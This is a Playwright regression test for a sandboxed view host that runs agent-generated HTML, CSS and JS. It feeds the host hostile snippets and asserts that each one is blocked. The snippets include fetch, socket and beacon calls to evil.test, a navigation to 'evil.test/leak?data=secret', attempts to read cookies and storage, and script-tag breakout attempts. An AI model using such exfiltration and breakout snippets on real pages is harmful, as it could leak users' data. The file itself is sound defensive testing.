#!/usr/bin/env node
/**
 * Hostile-content regressions for agent-created views (issue #13). A real
 * browser runs generated HTML/CSS/JS in the SandboxedView host and proves
 * what it can and cannot do. No server, no model: the page and its headers
 * are served by the test, and every network request is recorded.
 */
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { chromium, expect } from "@playwright/test";

const web = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const require = createRequire(import.meta.url);
const viteRequire = createRequire(require.resolve("vitest/package.json"));
const { build } = await import(pathToFileURL(viteRequire.resolve("vite")).href);
// The app's own response headers, as next.config.ts serves them.
const { APP_SECURITY_HEADERS } = await import(
  pathToFileURL(path.join(web, "src/lib/security-headers.mjs")).href
);

const entry = `
import React, { useState } from 'react';
import {createRoot} from 'react-dom/client';
import {SandboxedView} from '@/components/SandboxedView';
window.calls = [];
function Host() {
  const [state, setState] = useState(null);
  window.setView = setState;
  if (!state) return <p>Empty</p>;
  const actions = {};
  for (const name of state.allow || [])
    actions[name] = async (payload) => {
      window.calls.push({ name, payload });
      if (name === 'fail') throw new Error('secret internal detail');
      return { echoed: payload };
    };
  return <SandboxedView key={state.key} title="Test view" source={state.source} data={state.data} actions={actions} fallback={<p>Fallback content</p>} />;
}
createRoot(document.getElementById('root')).render(<Host/>);
`;
const bundle = await build({
  root: web,
  configFile: false,
  logLevel: "error",
  define: { "process.env.NODE_ENV": JSON.stringify("production") },
  resolve: { alias: { "@": path.join(web, "src") } },
  oxc: { jsx: { runtime: "automatic" } },
  plugins: [
    {
      name: "sandbox-entry",
      enforce: "pre",
      resolveId(id) {
        if (id === "sandbox-entry" || id === path.join(web, "sandbox-entry"))
          return "\0sandbox-entry.tsx";
      },
      load(id) {
        if (id === "\0sandbox-entry.tsx") return entry;
      },
    },
  ],
  build: {
    write: false,
    minify: false,
    lib: { entry: "sandbox-entry", formats: ["iife"], name: "Sandbox" },
  },
});
const code = (Array.isArray(bundle) ? bundle[0] : bundle).output.find(
  (x) => x.type === "chunk",
).code;

const browser = await chromium.launch({
  headless: true,
  ...(process.env["PLAYWRIGHT_CHROMIUM_PATH"]
    ? { executablePath: process.env["PLAYWRIGHT_CHROMIUM_PATH"] }
    : {}),
});
let passed = 0;
const ok = (name) => {
  passed++;
  console.log(`PASS ${name}`);
};
try {
  const page = await browser.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push(e.message));
  if (process.env["SANDBOX_DEBUG"])
    page.on("console", (m) => console.log("CONSOLE", m.text().slice(0, 180)));
  const requests = [];
  page.on("request", (r) => requests.push(r.url()));
  const downloads = [];
  page.on("download", (d) => downloads.push(d.suggestedFilename()));
  const popups = [];
  page.on("popup", (p) => popups.push(p.url()));
  let dialogs = 0;
  page.on("dialog", (d) => {
    dialogs++;
    void d.dismiss();
  });
  // What actually reaches the network: the route handler stands in for it.
  // (Playwright also reports requests a page creates and then blocks.)
  const reached = [];
  const failed = [];
  page.on("requestfailed", (r) =>
    failed.push({ url: r.url(), error: r.failure()?.errorText ?? "" }),
  );
  await page.route("**/*", (route) => {
    const url = route.request().url();
    reached.push(url);
    if (url.startsWith("https://app.test/"))
      return route.fulfill({
        contentType: "text/html",
        headers: Object.fromEntries(
          APP_SECURITY_HEADERS.map((h) => [h.key, h.value]),
        ),
        body: '<!doctype html><html><body><div id="root"></div></body></html>',
      });
    return route.fulfill({ status: 204, body: "" });
  });
  await page.goto("https://app.test/work");
  await page.addScriptTag({ content: code });
  await page
    .context()
    .addCookies([
      { name: "session", value: "secret-cookie", url: "https://app.test" },
    ]);
  await page.evaluate(() => localStorage.setItem("app", "secret-storage"));
  const show = (view) =>
    page.evaluate(
      (v) => window.setView({ key: String(Math.random()), ...v }),
      view,
    );
  const frame = () => page.frameLocator('iframe[title="Test view"]');
  const external = () =>
    reached.filter((u) => !u.startsWith("https://app.test/"));

  // 1. A view renders its own markup, style and script, gets its data, and
  //    grows to fit.
  await show({
    source: {
      html: '<h1 id="t">Rota</h1><ul id="list"></ul><div style="height:600px"></div>',
      css: "h1{color:rgb(10, 120, 60)}",
      js: `workagent.ready().then((d) => {
        for (const p of d.people) {
          const li = document.createElement('li'); li.textContent = p; list.appendChild(li);
        }
        document.body.dataset.ready = 'yes';
      });`,
    },
    data: { people: ["Ana", "Ben"] },
  });
  await expect(frame().locator("#list li")).toHaveText(["Ana", "Ben"]);
  await expect(frame().locator("#t")).toHaveCSS("color", "rgb(10, 120, 60)");
  await expect
    .poll(async () => (await page.locator("iframe").boundingBox()).height)
    .toBeGreaterThan(600);
  await expect(page.locator("figcaption")).toContainText(
    "can’t reach your account",
  );
  ok("renders generated HTML/CSS/JS with its data and sizes to content");

  // 2. Data that changes later reaches the view.
  await show({
    source: {
      html: '<p id="n"></p>',
      js: `workagent.ready().then((d) => { n.textContent = d.n; });
           addEventListener('workagent:data', (e) => { n.textContent = e.detail.n; });`,
    },
    data: { n: 1 },
  });
  await expect(frame().locator("#n")).toHaveText("1");
  await page.evaluate(() => window.setView((s) => ({ ...s, data: { n: 2 } })));
  await expect(frame().locator("#n")).toHaveText("2");
  ok("data updates after connection reach the view");

  // 3. Actions: only the ones the host was given; answers are generic on failure.
  await show({
    allow: ["echo", "fail"],
    source: {
      html: '<pre id="out"></pre>',
      js: `(async () => {
        const r = [];
        const tryIt = async (name, payload) => {
          try { r.push([name, { ok: await workagent.request(name, payload) }]); }
          catch (e) { r.push([name, { err: e.message }]); }
        };
        await tryIt('echo', { day: 'Mon' });
        await tryIt('fail', {});
        await tryIt('save_anything', {});
        await tryIt('constructor', {});
        await tryIt('toString', {});
        await tryIt('__proto__', {});
        await tryIt('Echo', {});
        out.textContent = JSON.stringify(r);
      })();`,
    },
    data: {},
  });
  await expect(frame().locator("#out")).not.toBeEmpty();
  const results = Object.fromEntries(
    JSON.parse(await frame().locator("#out").textContent()),
  );
  assert.deepEqual(results.echo, { ok: { echoed: { day: "Mon" } } });
  assert.deepEqual(results.fail, { err: "That didn’t work." });
  for (const name of [
    "save_anything",
    "constructor",
    "toString",
    "__proto__",
    "Echo",
  ])
    assert.ok(results[name].err, `${name} refused`);
  assert.deepEqual(
    (await page.evaluate(() => window.calls)).map((c) => c.name),
    ["echo", "fail"],
  );
  ok(
    "only granted actions run; others and prototype names are refused; failures stay generic",
  );

  // 4. Malformed, oversized and flooding messages get nothing.
  await page.evaluate(() => (window.calls = []));
  await show({
    allow: ["echo"],
    source: {
      html: '<p id="done"></p>',
      js: `(async () => {
        await workagent.ready();
        // Reach the raw port by replaying the handshake is impossible; use the API
        // with hostile values instead.
        const big = 'x'.repeat(70000);
        const res = [];
        for (const [a, p] of [['echo', big], ['echo', { f: big }]])
          try { await workagent.request(a, p); res.push('ran'); } catch { res.push('refused'); }
        const flood = await Promise.allSettled(Array.from({ length: 40 }, () => workagent.request('echo', 1)));
        res.push(flood.filter((x) => x.status === 'rejected').length);
        done.textContent = JSON.stringify(res);
      })();`,
    },
    data: {},
  });
  await expect(frame().locator("#done")).not.toBeEmpty({ timeout: 15000 });
  const flood = JSON.parse(await frame().locator("#done").textContent());
  assert.ok(
    flood[2] >= 10,
    `most of a 40-request flood is refused (${flood[2]})`,
  );
  const ran = await page.evaluate(() => window.calls);
  assert.ok(
    ran.length <= 30,
    `at most 30 requests per minute ran (${ran.length})`,
  );
  assert.ok(
    ran.every((c) => JSON.stringify(c.payload).length < 64000),
    "no oversized payload reached a handler",
  );
  ok("oversized messages never reach handlers; floods are rate-limited");

  // 5. No network: fetch, XHR, images, CSS, fonts, beacons, sockets, workers,
  //    nested frames, preloads and imports all fail before leaving the browser.
  requests.length = 0;
  reached.length = 0;
  failed.length = 0;
  await show({
    allow: ["report"],
    source: {
      html: `<img src="https://evil.test/img.png">
        <div style="background:url(https://evil.test/bg.png);width:10px;height:10px"></div>
        <link rel="stylesheet" href="https://evil.test/x.css">
        <link rel="prefetch" href="https://evil.test/prefetch">
        <iframe src="https://evil.test/frame"></iframe>
        <object data="https://evil.test/obj"></object>
        <video src="https://evil.test/v.mp4"></video>
        <p id="net"></p>`,
      css: "@font-face{font-family:x;src:url(https://evil.test/font.woff)} body{font-family:x}",
      js: `(async () => {
        const out = {};
        const attempt = async (name, fn) => {
          try { await fn(); out[name] = 'allowed'; } catch (e) { out[name] = 'blocked'; }
        };
        await attempt('fetch-external', () => fetch('https://evil.test/data'));
        await attempt('fetch-app', () => fetch('https://app.test/api/domain/v1/workspaces'));
        await attempt('fetch-relative', () => fetch('/api/domain/v1/workspaces'));
        await attempt('xhr', () => new Promise((res, rej) => {
          const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr');
          x.onload = res; x.onerror = rej; x.send();
        }));
        await attempt('websocket', () => new Promise((res, rej) => {
          const w = new WebSocket('wss://evil.test/ws'); w.onopen = res; w.onerror = rej;
        }));
        await attempt('eventsource', () => new Promise((res, rej) => {
          const s = new EventSource('https://evil.test/es'); s.onopen = res; s.onerror = rej;
        }));
        await attempt('beacon', () => { if (!navigator.sendBeacon('https://evil.test/beacon', 'x')) throw 0; });
        await attempt('worker', () => new Promise((res, rej) => {
          const w = new Worker('data:text/javascript,postMessage(1)');
          w.onmessage = res; w.onerror = rej; setTimeout(rej, 1500);
        }));
        await attempt('import', () => import('https://evil.test/m.js'));
        await new Promise((r) => setTimeout(r, 500));
        net.textContent = JSON.stringify(out);
        await workagent.request('report', out);
      })();`,
    },
    data: {},
  });
  await expect(frame().locator("#net")).not.toBeEmpty({ timeout: 15000 });
  const net = JSON.parse(await frame().locator("#net").textContent());
  // sendBeacon only reports that it queued the beacon; whether anything left
  // is what the network record below shows.
  for (const [name, outcome] of Object.entries(net))
    if (name !== "beacon")
      assert.equal(outcome, "blocked", `${name} is blocked`);
  await page.waitForTimeout(500);
  if (external().length) console.log("LEAKED", JSON.stringify(external()));
  assert.deepEqual(external(), [], "no request left for another origin");
  // Every external request the view created failed inside the browser.
  for (const url of requests.filter(
    (u) => !u.startsWith("https://app.test/") && !u.startsWith("data:"),
  ))
    assert.ok(
      failed.some((f) => f.url === url),
      `${url} was stopped in the browser`,
    );
  assert.deepEqual(
    reached.filter((u) => u.includes("/api/")),
    [],
    "no request reached the app's API",
  );
  ok(
    "no network: every fetch, load, socket, beacon, worker, frame and import is blocked",
  );

  // 6. No reach into the app: storage, cookies, parent DOM, top navigation,
  //    popups, dialogs, forms and downloads.
  await show({
    source: {
      html: `<form id="f" action="https://evil.test/form" method="post"><input name="a" value="1"></form>
        <a id="dl" href="data:text/plain,secret" download="secret.txt">x</a>
        <p id="reach"></p>`,
      js: `(async () => {
        const out = {};
        const attempt = (name, fn) => {
          try { const v = fn(); out[name] = v === undefined || v === null ? 'empty' : 'got:' + String(v).slice(0, 40); }
          catch (e) { out[name] = 'blocked'; }
        };
        attempt('cookie', () => document.cookie);
        attempt('localStorage', () => localStorage.getItem('app'));
        attempt('sessionStorage', () => sessionStorage.length);
        attempt('indexedDB', () => indexedDB.open('x') && undefined);
        attempt('parentDocument', () => parent.document.body.innerHTML);
        attempt('topLocation', () => top.location.href);
        attempt('openPopup', () => window.open('https://evil.test/popup'));
        attempt('alert', () => alert('hi'));
        attempt('submit', () => f.submit());
        attempt('download', () => dl.click());
        reach.textContent = JSON.stringify(out);
      })();`,
    },
    data: {},
  });
  await expect(frame().locator("#reach")).not.toBeEmpty();
  const reach = JSON.parse(await frame().locator("#reach").textContent());
  for (const name of [
    "cookie",
    "localStorage",
    "sessionStorage",
    "indexedDB",
    "parentDocument",
    "topLocation",
  ])
    assert.equal(reach[name], "blocked", `${name} is blocked`);
  assert.equal(reach.openPopup, "empty", "window.open returns nothing");
  await page.waitForTimeout(500);
  assert.deepEqual(popups, [], "no popup opened");
  assert.equal(dialogs, 0, "no dialog shown");
  assert.deepEqual(downloads, [], "no download started");
  assert.deepEqual(external(), [], "the form never submitted");
  assert.equal(new URL(page.url()).href, "https://app.test/work");
  ok(
    "no storage, cookies, parent DOM, top navigation, popups, dialogs, form posts or downloads",
  );

  // 7. Generated markup can't escape into the trusted page, even when it tries
  //    to close the script or style element it sits in.
  await show({
    source: {
      html: `<img src=x onerror="try{parent.document.body.dataset.pwned=1}catch(e){}">`,
      css: `</style><script>parent.document.body.dataset.pwned=2</script><style>`,
      js: `</script><script>try{parent.document.body.dataset.pwned=3}catch(e){}</script><script>`,
    },
    data: {},
  });
  await page.waitForTimeout(500);
  assert.equal(
    await page.evaluate(() => document.body.dataset.pwned ?? null),
    null,
  );
  assert.equal(await page.locator("iframe").count(), 1);
  // The escaped breakout attempt is now just invalid script inside the view;
  // that syntax error is the expected outcome, and the only one allowed.
  assert.deepEqual(errors, ["Unexpected token '<'"]);
  errors.length = 0;
  ok(
    "generated markup can't break out of its element or touch the trusted page",
  );

  // 8. A view that navigates itself is stopped, and nothing left the browser.
  requests.length = 0;
  reached.length = 0;
  await show({
    source: {
      html: "<p>Leaving</p>",
      js: "setTimeout(() => { location.href = 'https://evil.test/leak?data=secret'; }, 50);",
    },
    data: { secret: 1 },
  });
  await expect(page.getByRole("status")).toHaveText(
    "This view tried to load something else, so it was stopped.",
    { timeout: 10000 },
  );
  await expect(page.getByText("Fallback content")).toBeVisible();
  await expect(page.locator("iframe")).toHaveCount(0);
  assert.deepEqual(external(), [], "the navigation never reached the network");
  ok(
    "self-navigation is blocked by the app's frame policy and the view is stopped",
  );

  // 9. Views that are too large aren't rendered at all.
  await show({ source: { html: "x".repeat(600_000) }, data: {} });
  await expect(page.getByRole("status")).toHaveText(
    "This view is too large to show.",
  );
  await expect(page.locator("iframe")).toHaveCount(0);
  ok("oversized source is refused with readable fallback");

  assert.deepEqual(errors, []);
  console.log(
    `${passed} sandbox regressions passed (real browser; no server/provider).`,
  );
} finally {
  await browser.close();
}
